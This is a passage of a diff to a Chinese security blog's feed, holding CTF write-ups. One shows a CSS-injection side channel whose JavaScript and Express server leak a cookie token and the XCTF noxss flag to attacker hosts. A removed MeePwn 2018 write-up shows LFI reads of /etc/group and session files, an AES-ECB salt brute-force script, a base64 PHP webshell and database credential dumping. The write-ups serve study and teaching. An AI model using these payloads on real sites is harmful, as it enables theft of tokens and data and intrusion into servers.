+&amp;lt;big id=token&amp;gt;&amp;lt;/big&amp;gt;&amp;lt;br&amp;gt;
+&amp;lt;script&amp;gt;
+	(async function() {
+		const EXPECTED_TOKEN_LENGTH = 32;
+		const ALPHABET = Array.from(&amp;quot;0123456789abcdef&amp;quot;);
+		let extractedToken = await getTokenFromCookie();
+		if (extractedToken.length &amp;lt; EXPECTED_TOKEN_LENGTH) {
+			clearTokenCookie();
+			generateCSS();
+		}
+		// 读取 cookie
+		function getTokenFromCookie() {
+			return new Promise(resolve =&amp;gt; {
+				const interval = setInterval(function() {
+					const token = Cookies.get(&#39;token&#39;);
+					if (token) {
+						clearInterval(interval);
+						resolve(token);
+					}
+				}, 50);
+			});
+		}
+		// 清除现有 cookie
+		function clearTokenCookie() {
+			Cookies.remove(&#39;token&#39;);
+		}
+		// 生成 exp
+        function generateCSS() {
+            for (let c of ALPHABET) {
+                var css = &#39;&#39;;
+                css += `body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://192.168.1.180:3001/token/${encodeURIComponent(extractedToken+c)})}`;
+                css += `@font-face{font-family:a${c.charCodeAt()};src:url(http://192.168.1.180:3001/font/${extractedToken}/${c});}`;
+                css += `script{font-family:a${c.charCodeAt()};display:block}`
+                createIframeWithCss(css);
+            } 
+        }
+        // 创建 iframe
+        function createIframeWithCss(css) {
+            document.write(&#39;&amp;lt;iframe scrolling=yes samesite src=&amp;quot;http://192.168.1.180/demo.php?css=&#39; + encodeURIComponent(css) + &#39;&amp;quot; style=&amp;quot;width:1000000px&amp;quot; onload=&amp;quot;event.target.style.width=\&#39;100px\&#39;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;)
+        }
+	})();
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功在监听的 server 处收到了爆破的 token：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/attacker.png&#34; alt=&#34;attacker&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/server.png&#34; alt=&#34;server&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;简单总结：&lt;/p&gt;
+
+&lt;p&gt;如果存在一个可以利用的 CSS 注入，那么结合字体“连字”特性和滚动样式，可以侧信道出网页的任意内容。&lt;/p&gt;
+
+&lt;h2 id=&#34;实战-xctf-2019-final-noxss2019&#34;&gt;实战 - XCTF 2019 Final / noxss2019&lt;/h2&gt;
+
+&lt;p&gt;题目直接给了源码，源码审计后定位到 &lt;code&gt;account/models.py&lt;/code&gt;，flag 会在 user 创建时作为用户属性被赋予用户。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@receiver(post_save, sender=User)
+def create_or_update_user_profile(sender, instance, created, **kwargs):
+    if created:
+        Profile.objects.create(user=instance)
+        instance.profile.secret = &#39;flag&#39; if instance.is_staff else &#39;you have no secret&#39;
+    instance.profile.save()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;结合 &lt;code&gt;run.sh&lt;/code&gt;，很明显本题需要获得 admin 的 secret：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;...
+python manage.py shell -c &amp;quot;from bot_config import bot; from django.contrib.auth.models import User; User.objects.create_user(is_staff=True, **bot).save()&amp;quot;
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;继续审计代码，发现 account/userinfo.html 会使用 &lt;code&gt;secret&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/source.png&#34; alt=&#34;source&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;回到我们可控的输入点，很明显只有 theme 参数可以控制：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/theme.png&#34; alt=&#34;theme&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但测试后发现此处无法闭合标签，注入的范围局限到了 CSS，但我们可以使用 %0f 进行逃逸从而写入任意 CSS 样式。&lt;/p&gt;
+
+&lt;p&gt;同时观察到 flag 的位置，位于 secret 标签内：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/xctf-secret.png&#34; alt=&#34;XCTF secret&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;很明显本题的考点就是上一节讲的，利用字体“连字”特性结合滚动条样式进行侧信道。&lt;/p&gt;
+
+&lt;p&gt;这里直接贴一下 ROIS - zsx 师傅的思路：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;原理：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;将页面宽度设置为100000px，保证不会出现滚动条；&lt;/li&gt;
+&lt;li&gt;隐藏页面内所有元素，然后将script标签显示出来；&lt;/li&gt;
+&lt;li&gt;为script标签设置字体，如果匹配到了对应字符，则显示滚动条；&lt;/li&gt;
+&lt;li&gt;通过滚动条接收当前字符。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;把这个页面的URL直接交给bot，即可接收到一位的flag。之后逐位爆破即可。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;然后我为了爆破方便继续改了前文的脚本，用了 ejs 模板直接渲染，这样每次可以少手动修改（偷懒）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const express = require(&#39;express&#39;);
+const app = express();
+
+app.disable(&#39;etag&#39;);
+app.set(&#39;view engine&#39;,&#39;ejs&#39;);
+
+const js2xmlparser = require(&#39;js2xmlparser&#39;);
+const fs = require(&#39;fs&#39;);
+const tmp = require(&#39;tmp&#39;);
+const rimraf = require(&#39;rimraf&#39;);
+const child_process = require(&#39;child_process&#39;);
+
+const HOST = &amp;quot;www.syang.xyz&amp;quot;
+const PORT = 3210;
+let flag = &#39;xctf{dobra_robota_jestes_mistrzem_CSS&#39;
+
+function createFont(prefix, charsToLigature) {
+    let font = {
+        &amp;quot;defs&amp;quot;: {
+            &amp;quot;font&amp;quot;: {
+                &amp;quot;@&amp;quot;: {
+                    &amp;quot;id&amp;quot;: &amp;quot;hack&amp;quot;,
+                    &amp;quot;horiz-adv-x&amp;quot;: &amp;quot;0&amp;quot;
+                },
+                &amp;quot;font-face&amp;quot;: {
+                    &amp;quot;@&amp;quot;: {
+                        &amp;quot;font-family&amp;quot;: &amp;quot;hack&amp;quot;,
+                        &amp;quot;units-per-em&amp;quot;: &amp;quot;1000&amp;quot;
+                    }
+                },
+                &amp;quot;glyph&amp;quot;: []
+            }
+        }
+    };
+
+    let glyphs = font.defs.font.glyph;
+    for (let c = 0x20; c &amp;lt;= 0x7e; c += 1) {
+        const glyph = {
+            &amp;quot;@&amp;quot;: {
+                &amp;quot;unicode&amp;quot;: String.fromCharCode(c),
+                &amp;quot;horiz-adv-x&amp;quot;: &amp;quot;0&amp;quot;,
+                &amp;quot;d&amp;quot;: &amp;quot;M1 0z&amp;quot;,
+            }
+        };
+        glyphs.push(glyph);
+    }
+
+    charsToLigature.forEach(c =&amp;gt; {
+        const glyph = {
+            &amp;quot;@&amp;quot;: {
+                &amp;quot;unicode&amp;quot;: prefix + c,
+                &amp;quot;horiz-adv-x&amp;quot;: &amp;quot;10000&amp;quot;,
+                &amp;quot;d&amp;quot;: &amp;quot;M1 0z&amp;quot;,
+            }
+        }
+        glyphs.push(glyph);
+    });
+
+    const xml = js2xmlparser.parse(&amp;quot;svg&amp;quot;, font);
+
+    const tmpobj = tmp.dirSync();
+    fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
+    child_process.spawnSync(&amp;quot;/usr/bin/fontforge&amp;quot;, [
+        `${__dirname}/script.fontforge`,
+        `${tmpobj.name}/font.svg`
+    ]);
+
+    const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);
+
+    rimraf.sync(tmpobj.name);
+
+    return woff;
+}
+
+app.get(&amp;quot;/font/:prefix/:charsToLigature&amp;quot;, (req, res) =&amp;gt; {
+    const { prefix, charsToLigature } = req.params;
+    res.set({
+        &#39;Cache-Control&#39;: &#39;public, max-age=600&#39;,
+        &#39;Content-Type&#39;: &#39;application/font-woff&#39;,
+        &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39;,
+    });
+    res.send(createFont(prefix, Array.from(charsToLigature)));
+});
+
+app.get(&amp;quot;/flag/:chars&amp;quot;, function(req, res) {
+    //flag = req.params.chars
+    console.log(req.params.chars);
+    let c = req.params.chars[req.params.chars.length - 1];
+    if(req.params.chars.includes(flag)) {
+        flag = req.params.chars
+    }
+    res.send(&#39;flag&#39;)
+});
+
+app.get(&#39;/&#39;, (req, res) =&amp;gt; {
+    res.render(&#39;index&#39;, {
+        flag: flag,
+        host: HOST,
+        port: PORT
+    });
+});
+
+app.listen(PORT, () =&amp;gt; {
+	console.log(`Listening on ${PORT}...`);
+})
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;index.ejs 如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ejs&#34;&gt;&amp;lt;script&amp;gt;
+const chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}&#39;.split(&#39;&#39;)
+const prefix = &#39;&amp;lt;%= flag %&amp;gt;&#39;
+chars.forEach(c =&amp;gt; {
+    let css = &#39;?theme=../../../../\fa{}){}&#39;;
+    css += `body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://&amp;lt;%= host %&amp;gt;:&amp;lt;%= port %&amp;gt;/flag/${encodeURIComponent(prefix+c)})}`
+    css += `@font-face{font-family:a${c.charCodeAt()};src:url(http://&amp;lt;%= host %&amp;gt;:&amp;lt;%= port %&amp;gt;/font/${prefix}/${c});}`
+    css += `script{font-family:a${c.charCodeAt()};display:block}`
+    document.write(&#39;&amp;lt;iframe scrolling=yes samesite src=&amp;quot;http://noxss.cal1.cn:60080/account/userinfo?theme=&#39; + encodeURIComponent(css) + &#39;&amp;quot; style=&amp;quot;width:1000000px&amp;quot; onload=&amp;quot;event.target.style.width=\&#39;100px\&#39;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&#39;)
+})
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最终获得 flag：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/From-CSS-To-XSS/flag.png&#34; alt=&#34;flag&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;本文总结了两种利用 CSS 泄露网页内容的攻击方式，第一种较为简单，但仅能泄露出标签属性；而第二种结合了字体和滚动条样式，攻击更为复杂但可以泄露的内容更多。&lt;/p&gt;
+
+&lt;p&gt;虽然 CSS 的注入并不能真正达到 XSS 的效果，但如果存在一个我们可以控制的 CSS 注入点，那么无论是属性，亦或是网页内的内容，我们都可以通过侧信道的方式带出，这同样会给用户带来安全上的隐患，比如说 csrf token 的泄露等问题。&lt;/p&gt;
+
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Stealing data in a great way - how to use CSS to attack webapplication&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.mzh.ren/ligature-intro.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;连字简述&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/6655#toc-5&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;XCTF final 2019 Writeup By ROIS - noxss&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>Windows Defender 侧信道攻击</title>
@@ -3922,244 +4639,6 @@ if __name__ == &#39;__main__&#39;:
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;p4 - 2018-07-21-ctfzone-quals&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://ctftime.org/event/632/tasks/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;writeup on ctftime&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>MeePwn CTF 2018 Web Part2</title>
-      <link>https://syang-ng.github.io/2018/07/meepwnctf-2018-web-part2/</link>
-      <pubDate>Fri, 20 Jul 2018 15:00:22 +0000</pubDate>
-      
-      <guid>https://syang-ng.github.io/2018/07/meepwnctf-2018-web-part2/</guid>
-      <description>
-
-&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
-
-&lt;p&gt;MeePwn CTF 2018 剩下的 Web 题，主要是基于 PHP 的代码审计，考点颇多，恰好是我所不擅长的区域😭&lt;/p&gt;
-
-&lt;p&gt;赶紧来复现一下提高姿势水平&lt;/p&gt;
-
-&lt;h2 id=&#34;mapl-story&#34;&gt;Mapl Story&lt;/h2&gt;
-
-&lt;p&gt;主要考点有 PHP 代码审计能力，以及对 PHP session 的理解，PHP webshell 的利用，和对 AES-128-ECB 的攻击&lt;/p&gt;
-
-&lt;h3 id=&#34;lfi&#34;&gt;LFI&lt;/h3&gt;
-
-&lt;p&gt;访问以下 URL，可以发现这里存在着一个文件包含问题&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;http://178.128.87.16/?page=/etc/group
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;root❌0: daemon❌1: bin❌2: sys❌3: adm❌4:syslog tty❌5: disk❌6: lp❌7: mail❌8: news❌9: uucp❌10: man❌12: proxy❌13: kmem❌15: dialout❌20: fax❌21: voice❌22: cdrom❌24: floppy❌25: tape❌26: sudo❌27: audio❌29: dip❌30: www-data❌33: backup❌34: operator❌37: list❌38: irc❌39: src❌40: gnats❌41: shadow❌42: utmp❌43: video❌44: sasl❌45: plugdev❌46: staff❌50: games❌60: users❌100: nogroup❌65534: systemd-journal❌101: systemd-timesync❌102: systemd-network❌103: systemd-resolve❌104: systemd-bus-proxy❌105: input❌106: crontab❌107: syslog❌108: netdev❌109: lxd❌110: messagebus❌111: uuidd❌112: ssh❌113: mlocate❌114: admin❌115: docker❌116: ssl-cert❌117: mysql❌118:
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;但可以看到由于在 &lt;code&gt;index.php&lt;/code&gt; 中存在着相应的过滤：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function bad_words($value)
-{
-	//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.
-	//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!
-	$too_bad=&amp;quot;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is&amp;quot;;
-	$value = preg_replace($too_bad, str_repeat(&amp;quot;*&amp;quot;,3) ,$value);
-	return $value;
-}
-
-foreach($_GET as $key=&amp;gt;$value)
-{
-    if (is_array($value))
-    {
-    	mapl_die();
-    }
-	$value=bad_words($value);
-	$_GET[$key]=$value;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;暂时看来操作幅度不大，不过这里存在的意义在于我们可以泄露出相应 session 的信息&lt;/p&gt;
-
-&lt;p&gt;已知我们 PHPSESSID 的值为 &lt;code&gt;o2c7bnl64jf2va8edho3ectvb6&lt;/code&gt;，那么我们可以尝试通过以下网址访问我们的：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_o2c7bnl64jf2va8edho3ectvb6
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code&gt;character_name|s:64:&amp;quot;ecbce3a67b2cc65c58209871a7e43ea5f784018f9d30944e3a1aa542e3c48140&amp;quot;;user|s:64:&amp;quot;2e1e63cfe3e8ac1b0292d31d97824c92aff14592cde39c9bf27d7c5ef2a1c872&amp;quot;;action|s:28:&amp;quot;[03:53:29pm GMT+7] Logged In&amp;quot;;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;admin&#34;&gt;Admin&lt;/h3&gt;
-
-&lt;p&gt;尝试访问 &lt;code&gt;admin.php&lt;/code&gt;，发现程序提示我们没有相应的 admin 权限，这意味着我们的第一步很可能是先变为 admin&lt;/p&gt;
-
-&lt;p&gt;审计代码，可以看到服务器对 admin 的校验是以 Cookie 中的 &lt;code&gt;_role&lt;/code&gt; 为依据的&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function is_admin($salt){
-    if(isset($_COOKIE[&#39;_role&#39;]) &amp;amp;&amp;amp; !empty($_COOKIE[&#39;_role&#39;]) &amp;amp;&amp;amp; $_COOKIE[&#39;_role&#39;]===hash(&#39;sha256&#39;, &#39;admin&#39;.$salt)) {
-        return 1;
-    }
-        return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;只有当 &lt;code&gt;sha256(&#39;admin&#39;.$salt)&lt;/code&gt; 的值与 Cookie 中 &lt;code&gt;_role&lt;/code&gt; 值相等时，服务器会主动将用户识别为 admin&lt;/p&gt;
-
-&lt;p&gt;继续审计代码，我们得到的结论是，我们无法通过手动修改 Cookie 外的方式成为 admin，因为服务端会默认将所有人设置成 user：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// login
-if ($row[&#39;userIsAdmin&#39;]===&#39;1&#39;){
-    $data=&#39;admin&#39;.$salt;
-    $role=hash(&#39;sha256&#39;, $data);
-    setcookie(&#39;_role&#39;,$role);
-} else {
-    $data=&#39;user&#39;.$salt;
-    $role=hash(&#39;sha256&#39;, $data);
-    setcookie(&#39;_role&#39;,$role);					
-}
-// register
-$query = &amp;quot;INSERT INTO users(`userName`, `userEmail`, `userPass`, `userIsAdmin`, `userDesc`, `userAvatar`) VALUES(&#39;$name&#39;,&#39;$email&#39;,&#39;$password&#39;,0,&#39; &#39;,&#39;default.png&#39;)&amp;quot;;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;那么我们唯一的思路即通过计算出 &lt;code&gt;$salt&lt;/code&gt; 的方式来计算出我们希望的 sha256 值，脚本如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
-import string
-
-s = requests.Session()
-
-def login():
-    payload = {&amp;quot;email&amp;quot;: &amp;quot;qwe@eee.com&amp;quot;, &amp;quot;pass&amp;quot;: &amp;quot;qweqwe&amp;quot;, &amp;quot;btn-login&amp;quot;: 1}
-    return s.post(&#39;http://178.128.87.16/index.php?page=login.php&#39;, data=payload)
-
-def change_name(name):
-    payload = {&amp;quot;name&amp;quot;:name}
-    return s.post(&#39;http://178.128.87.16/index.php?page=setting.php&#39;, data=payload)
-
-def get_sha256(text):
-    return text[21:85]
-
-
-def main():
-    sess = &#39;http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_&#39;
-    base = &#39;A&#39;*16
-    salt = &#39;&#39;
-    guess_range = string.printable
-
-    assert(&#39;Game&#39; in login().text)
-    
-    sess += s.cookies[&#39;PHPSESSID&#39;]
-
-    print(sess)
-
-    while len(salt) &amp;lt; 16:
-        base = base[👎]
-        if base == &#39;&#39;:
-            name = &#39;A&#39;*16
-        else:
-            name = base
-        change_name(name)
-        s1 = get_sha256(s.get(sess).text)
-        s1 = s1[:32] if len(name) != 16 else s1[32:64]
-        for i in guess_range:
-            name = base + salt + i
-            change_name(name)
-            s2 = get_sha256(s.get(sess).text)[:32]
-            if s1 == s2:
-                salt += i
-                print(salt)
-                break
-    print(salt)
-
-if __name__ == &#39;__main__&#39;:
-    main()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;核心思路还是 ECB 模式的缺陷，即 ECB 的每一块都是使用完全相同的方式进行界面加解密，所以明文和密文的每一块都是一一对应的，这也给了我们暴力猜解 &lt;code&gt;$salt&lt;/code&gt; 的可能性，我们只需要通过枚举的方式，将 &lt;code&gt;$salt&lt;/code&gt; 枚举出即可: &lt;code&gt;ms_g00d_0ld_g4m3&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;计算 &lt;code&gt;sha256(&#39;admin&#39;.&#39;ms_g00d_0ld_g4m3&#39;)&lt;/code&gt; 即能以 admin 的状态登录了~~&lt;/p&gt;
-
-&lt;h3 id=&#34;webshell&#34;&gt;webshell&lt;/h3&gt;
-
-&lt;p&gt;在 admin 状态下，我们多了一个赠送宠物的功能：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/mapl_story_admin.png&#34; alt=&#34;Admin&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;我们可以尝试给自己赠送一个宠物，然后在 &lt;code&gt;character.php&lt;/code&gt; 来训练一个宠物：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/mapl_story_character.png&#34; alt=&#34;Character&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;继续审计 PHP 代码，我们可以知道相应的命令会被存入 &lt;code&gt;/upload/md5($salt.$email)/command.txt&lt;/code&gt; 中：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if(isset($_POST[&#39;command&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;command&#39;])){
-    if(strlen($_POST[&#39;command&#39;])&amp;gt;=20) {
-        echo &#39;&amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;Too Long&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;&#39;;
-    }
-    else {
-        save_command($mail,$salt,$_POST[&#39;command&#39;]);
-        header(&amp;quot;Refresh:0&amp;quot;);
-    }
-}
-
-function save_command($email,$salt,$data){
-    $dir=&#39;./upload/&#39;.md5($salt.$email);
-    file_put_contents($dir.&#39;/command.txt&#39;, $data);
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;那么我们可不可以直接在这里写入 webshell 呢？再利用 LFI 加载该文件以达成 webshell 效果，但事实是这条尝试是失败的😭&lt;/p&gt;
-
-&lt;p&gt;那么剩下的思路是再从新的地方尝试导入我们编写的 webshell&lt;/p&gt;
-
-&lt;p&gt;这里的思路就比较 trick 了（向大佬低头&lt;/p&gt;
-
-&lt;p&gt;我们可以看到 session 的 log 中存在一个记录用户操作的 &lt;code&gt;action&lt;/code&gt;，所以我们可以尝试向 &lt;code&gt;&amp;lt;?=include&amp;quot;$_COOKIE[0]&lt;/code&gt; 用户赠送宠物，这样当我们修改 cookie 时，相应的文件即可被加载进来&lt;/p&gt;
-
-&lt;p&gt;此时我们需要进行如下三个操作：&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;修改 command.txt 内容，使其值为&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PD89YCRFR0VUWZFDYDS`(&amp;lt;?=`$_GET[1]`)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ol&gt;
-&lt;li&gt;注册用户名为 &lt;code&gt;&amp;lt;?=include&amp;quot;$_COOKIE[0]&lt;/code&gt;，并向其赠送宠物&lt;/li&gt;
-&lt;li&gt;修改 cookie 加入 &lt;code&gt;{0: php://filter/convert.base64-decode/resource=/upload/64aed470d7164b1fdf381db0cd82ebd7/command.txt}&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;访问 &lt;code&gt;http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_o2c7bnl64jf2va8edho3ectvb6?1=ls&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;此时我们已经拿到了一个最基本的 webshell，构造 payload，我们即能得到 &lt;code&gt;dbconnect.php&lt;/code&gt; 相对应的源代码：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_o2c7bnl64jf2va8edho3ectvb6&amp;amp;1=cat%20dbconnect.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; &amp;lt;?php
-	define(&#39;DBHOST&#39;, &#39;localhost&#39;);
-	define(&#39;DBUSER&#39;, &#39;mapl_story_user&#39;);
-	define(&#39;DBPASS&#39;, &#39;tsu_tsu_tsu_tsu&#39;); 
-	define(&#39;DBNAME&#39;, &#39;mapl_story&#39;);
-	
-	$conn = mysqli_connect(DBHOST,DBUSER,DBPASS,DBNAME);
-		
-	if ( !$conn ) {
-		die(&amp;quot;Connection failed : &amp;quot; . mysql_error());
-    }
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;此时我们已经拿到了数据库的账号密码，以及相应的数据库名，那么只要在数据库中运行 &lt;code&gt;SELECT * FROM mapl_config&lt;/code&gt;，即能获得相应的 flag&lt;/p&gt;
-
-&lt;p&gt;我们需要实现以下两步：
-1. 连接数据库：mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story
-2. 查询 flag：SELECT * FROM mapl_config;&lt;/p&gt;
-
-&lt;p&gt;那么写成 payload 即可以如下形式：&lt;code&gt;echo &#39;SELECT * FROM mapl_config;&#39;| mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;运行 payload，即可获得 flag：MeePwnCTF{&lt;strong&gt;Abus1ng_SessioN_Is_AlwAys_C00L_1337!&lt;/strong&gt;_}&lt;/p&gt;
-
-&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/10418&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Mapl Story by RedRocket&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
